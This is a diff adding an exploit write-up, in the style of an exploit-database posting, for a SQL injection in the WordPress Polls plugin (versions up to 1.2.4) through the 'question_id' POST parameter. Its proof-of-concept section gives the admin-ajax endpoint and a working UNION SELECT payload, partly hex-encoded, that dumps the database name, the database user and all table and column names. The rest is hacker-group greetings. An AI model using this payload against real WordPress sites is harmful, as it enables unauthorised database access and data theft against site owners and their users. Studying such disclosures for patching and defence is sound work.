@@ -1,0 +1,38 @@
+<b>Exploit Title :WordPress Polls plugin(1.2.4) SQL Injection vulnerability</b>
+<br>
+Vulnerable version:<=1.2.4
+<br>Download Link	: https://downloads.wordpress.org/plugin/polls-widget.1.2.4.zip  
+
+////////////////////////
+<br>/// Overview:
+<br>////////////////////////
+<br>  
+<br>WordPress Polls plugin is a tool for creating polls and survey forms. You can use polls on widgets, posts and pages. Plugin code accept answer from user using survey form. During this process, HTTP POST parameter "question_id" goes to SQL query without data senitization which arise SQL Injection vulnerability. Vulnerable code is in "fornt_end/fornt_end.php" file.
+
+  
+////////////////
+<br>
+///  POC   ////
+<br>
+///////////////
+ <br>
+ SQL Injection payload to enumerate tables
+<br>----------------------------------------------
+<br>http://ica.lab/wp-admin/admin-ajax.php?action=pollinsertvalues
+<br><b>Post data</b>
+<br>question_id=-3 union select  concat(0x3c62723e3c666f6e7420636f6c6f723d626c61636b2073697a653d343e3c623e2d2d3d3d5b5b20496e64695368656c6c204c61625d5d3d3d2d2d203c62723e4461746162617365204e616d653a202d ,database(),0x3c62723e,0x446174616261736520557365723a202d20,user(),0x3c62723e,group_concat(0x3c62723e,table_name,0x7e,column_name),0x3c62723e,0x3c62723e3c62723e3c62723e),2 from information_schema.columns where table_schema=database()--&poll_answer_securety=0c7d4ce561&date_answers[0]=5
+ 
+  
+POC<br>
+ <img src="https://github.com/incredibleindishell/exploit-code-by-me/blob/master/WordPress%20Polls%20plugin-1.2.4-%20SQL%20Injection%20vulnerability/injected.png?raw=true">
+ <br>
+  
+                             --==[[ Greetz To ]]==--
+Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
+<br>Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
+<br>Hackuin,Alicks,mike waals,cyber gladiator,Cyber Ace,Golden boy INDIA,d3, rafay baloch, nag256
+<br>Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
+ <br>
+                              --==[[ Love To ]]==--
+<br>My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
+<br>Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)
